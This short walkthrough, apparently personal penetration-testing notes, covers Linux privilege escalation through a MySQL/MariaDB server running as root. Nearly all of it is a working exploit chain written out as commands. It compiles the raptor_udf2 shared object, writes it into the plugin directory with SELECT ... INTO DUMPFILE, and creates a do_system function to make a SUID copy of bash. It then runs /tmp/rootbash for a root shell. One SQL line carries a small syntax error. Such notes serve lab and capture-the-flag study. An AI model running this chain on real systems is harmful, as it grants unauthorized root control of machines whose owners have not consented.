# MySQL 4.x/5.x

## Enumerate programs running

```bash
$ ps aux | grep "^root"
```

Check MySQL configuration:
```bash
$ cat /etc/mysql/mariadb.conf.d/50-server.cnf | grep -v "#" | grep "user"
user = root
```

## Prepare the exploit
### Download and compile it
- Exploit: https://www.exploit-db.com/exploits/1518

```bash
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

## Create MySQL function
### Connect to MySQL
```bash
$ mysql -u root -p
```

### Find the plugins directory
```bash
mysql> show variables like 'plugin_dir';
+---------------+---------------------------------------------+
| Variable_name | Value                                       |
+---------------+---------------------------------------------+
| plugin_dir    | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
+---------------+---------------------------------------------+
```

### Load the shared object into MySQL

```bash
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/raptor_udf2.so';);
mysql> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
mysql> exit
```

## Get root shell
### Execute rootbash shell

```bash
$ /tmp/rootbash -p
```